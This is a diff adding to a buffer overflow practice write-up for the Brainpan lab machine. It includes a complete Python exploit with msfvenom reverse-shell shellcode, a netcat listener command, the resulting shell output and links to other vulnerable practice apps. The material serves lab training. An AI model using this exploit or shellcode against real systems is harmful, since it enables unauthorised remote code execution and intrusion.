@@ -122,7 +122,7 @@ import socket
 import sys
 
 # setup the Target's IP and port.
-RHOST = "192.168.56.123"
+RHOST = "192.168.56.101"
 RPORT = 9999
 
 # create a TCP connection (socket)
@@ -541,9 +541,131 @@ Getting a reverse-shell is just a matter of swapping the shellcode.
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=443 -f python -v shellcode -b '\x00\x0A' EXITFUNC=thread
 ```
 
+The final exploit is saved simply as `exploit.py`
+
+```
+
+#!/usr/bin/env python2
+import socket
+import struct
+
+RHOST = "192.168.56.123"
+RPORT = 9999
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
 
 
-. . . To Be Continued . . .
+buf_totlen = 1024
+offset_srp = 524
+
+ptr_jmp_esp = 0x311712F3
+
+sub_esp_10 = "\x83\xec\x10"
+
+# reverse_shell set lport=6969
+shellcode =  ""
+shellcode += "\xba\xa1\xdf\x76\xda\xd9\xe9\xd9\x74\x24\xf4\x5d"
+shellcode += "\x29\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x64"
+shellcode += "\xdb\x94\x2f\x9a\x0c\xda\xd0\x62\xcd\xbb\x59\x87"
+shellcode += "\xfc\xfb\x3e\xcc\xaf\xcb\x35\x80\x43\xa7\x18\x30"
+shellcode += "\xd7\xc5\xb4\x37\x50\x63\xe3\x76\x61\xd8\xd7\x19"
+shellcode += "\xe1\x23\x04\xf9\xd8\xeb\x59\xf8\x1d\x11\x93\xa8"
+shellcode += "\xf6\x5d\x06\x5c\x72\x2b\x9b\xd7\xc8\xbd\x9b\x04"
+shellcode += "\x98\xbc\x8a\x9b\x92\xe6\x0c\x1a\x76\x93\x04\x04"
+shellcode += "\x9b\x9e\xdf\xbf\x6f\x54\xde\x69\xbe\x95\x4d\x54"
+shellcode += "\x0e\x64\x8f\x91\xa9\x97\xfa\xeb\xc9\x2a\xfd\x28"
+shellcode += "\xb3\xf0\x88\xaa\x13\x72\x2a\x16\xa5\x57\xad\xdd"
+shellcode += "\xa9\x1c\xb9\xb9\xad\xa3\x6e\xb2\xca\x28\x91\x14"
+shellcode += "\x5b\x6a\xb6\xb0\x07\x28\xd7\xe1\xed\x9f\xe8\xf1"
+shellcode += "\x4d\x7f\x4d\x7a\x63\x94\xfc\x21\xec\x59\xcd\xd9"
+shellcode += "\xec\xf5\x46\xaa\xde\x5a\xfd\x24\x53\x12\xdb\xb3"
+shellcode += "\x94\x09\x9b\x2b\x6b\xb2\xdc\x62\xa8\xe6\x8c\x1c"                                                                                                                               
+shellcode += "\x19\x87\x46\xdc\xa6\x52\xc8\x8c\x08\x0d\xa9\x7c"                                                                                                                               
+shellcode += "\xe9\xfd\x41\x96\xe6\x22\x71\x99\x2c\x4b\x18\x60"                                                                                                                               
+shellcode += "\xa7\xb4\x75\x52\x36\x5d\x84\xa2\x23\xa4\x01\x44"                                                                                                                               
+shellcode += "\x39\xc6\x47\xdf\xd6\x7f\xc2\xab\x47\x7f\xd8\xd6"                                                                                                                               
+shellcode += "\x48\x0b\xef\x27\x06\xfc\x9a\x3b\xff\x0c\xd1\x61"                                                                                                                               
+shellcode += "\x56\x12\xcf\x0d\x34\x81\x94\xcd\x33\xba\x02\x9a"                                                                                                                               
+shellcode += "\x14\x0c\x5b\x4e\x89\x37\xf5\x6c\x50\xa1\x3e\x34"                                                                                                                               
+shellcode += "\x8f\x12\xc0\xb5\x42\x2e\xe6\xa5\x9a\xaf\xa2\x91"                                                                                                                               
+shellcode += "\x72\xe6\x7c\x4f\x35\x50\xcf\x39\xef\x0f\x99\xad"                                                                                                                               
+shellcode += "\x76\x7c\x1a\xab\x76\xa9\xec\x53\xc6\x04\xa9\x6c"
+shellcode += "\xe7\xc0\x3d\x15\x15\x71\xc1\xcc\x9d\x91\x20\xc4"
+shellcode += "\xeb\x39\xfd\x8d\x51\x24\xfe\x78\x95\x51\x7d\x88"
+shellcode += "\x66\xa6\x9d\xf9\x63\xe2\x19\x12\x1e\x7b\xcc\x14"
+shellcode += "\x8d\x7c\xc5"
+
+buf = ""
+buf += "A"*(offset_srp - len(buf))     # padding
+buf += struct.pack("<I", ptr_jmp_esp)  # SRP overwrite
+buf += sub_esp_10                      # ESP points here
+buf += shellcode
+buf += "D"*(buf_totlen - len(buf))     # trailing padding
+buf += "\n"
+
+s.send(buf)
+
+```
+
+Set an nc listener:
+
+```
+nc -nlvp 6969
+```
+
+The exploit works, and we get our reverse-shell.
+
+```
+
+ nc -nlvp 6969
+Listening on [0.0.0.0] (family 0, port 6969)
+Connection from 192.168.56.123 55541 received!
+CMD Version 1.4.1
+
+Z:\home\puck>dir
+Volume in drive Z has no label.
+Volume Serial Number is 0000-0000
+
+Directory of Z:\home\puck
+
+  3/6/2013   3:23 PM  <DIR>         .
+  3/4/2013  11:49 AM  <DIR>         ..
+  3/6/2013   3:23 PM           513  checksrv.sh
+  3/4/2013   2:45 PM  <DIR>         web
+       1 file                       513 bytes
+       3 directories     13,844,946,944 bytes free
+
+
+```
+
+
+Since this is a practice run for Buffer Overflows, rather than a machine writeup for Brainpan,
+
+I'll leave things there.
+
+
+################
+
+
+Whilst looking for more practice, I stumbled upon [this site here](https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
+)
+
+It had a few links to vulnerable apps to try:
+
+[slmail] https://www.exploit-db.com/exploits/638/
+
+[freefloatFTP] https://www.exploit-db.com/exploits/17546/
+
+[minishare] https://www.exploit-db.com/exploits/636/
+
+[savant] https://www.exploit-db.com/exploits/10434/
+
+[warFTPD (XP)] https://www.exploit-db.com/exploits/3570/
+
+Have fun!
+
+#############
 
 
 
